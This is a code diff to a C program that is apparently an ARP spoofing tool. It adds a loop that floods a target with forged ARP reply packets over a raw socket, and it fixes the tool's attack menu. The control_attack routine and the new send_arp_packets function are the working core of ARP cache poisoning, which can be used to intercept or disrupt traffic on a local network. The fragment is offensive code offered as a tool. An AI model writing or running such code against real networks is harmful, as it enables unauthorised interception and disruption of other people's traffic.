@@ -83,10 +83,25 @@ void set_socket(struct sockaddr_ll * addr, arp_addrs_t arp_addrs)
     memcpy(addr->sll_addr, arp_addrs.target_mac, 6);
 }
 
+void send_arp_packets(int sock,uint8_t* reply_arp,struct sockaddr_ll addr, int count)
+{
+  while(count>0)
+  {
+    if (sendto(sock, reply_arp, ARP_PACKET_SIZE, 0, (struct sockaddr *)&addr, sizeof(addr)) < 0) 
+    {
+      perror("sendto");
+      exit(1);
+    }
+    usleep(3);
+    count--;
+  }
+
+}
+
 void control_attack()
 {
   int sock;
-  uint8_t reply_arp[42];
+  uint8_t reply_arp[ARP_PACKET_SIZE];
 
   arp_addrs_t arp_addrs = init_addrs();
 
@@ -100,10 +115,7 @@ void control_attack()
   struct sockaddr_ll addr = {0};
   set_socket(&addr, arp_addrs);
 
-  if (sendto(sock, reply_arp, 42, 0, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
-      perror("sendto");
-      exit(1);
-  }
+  send_arp_packets(sock,reply_arp,addr,PACKET_SEND_COUNT);
 
   printf("ARP Reply sent!\n");
 
@@ -113,9 +125,9 @@ void control_attack()
 
 void arp_attack_handle_user(char option)
 {
-  int option_int= atoi(option);
+  int option_int= option;
   switch(option_int){
-  case 2:
+  case '2':
     control_attack();
     break;
   }
@@ -125,15 +137,15 @@ void arp_attack_handle_user(char option)
 void arp_attack_menu_controller()
 {
   char option = 0;
-  banner();
+  arp_attack_banner();
 
   while(option != '3')
   {
-    show_menu();
+    show_arp_attack_menu();
     option = getchar();
     getchar();
     printf("User entered: %c\n",option);
-    handle_user(char option);
+    arp_attack_handle_user(option);
   }
 
 }
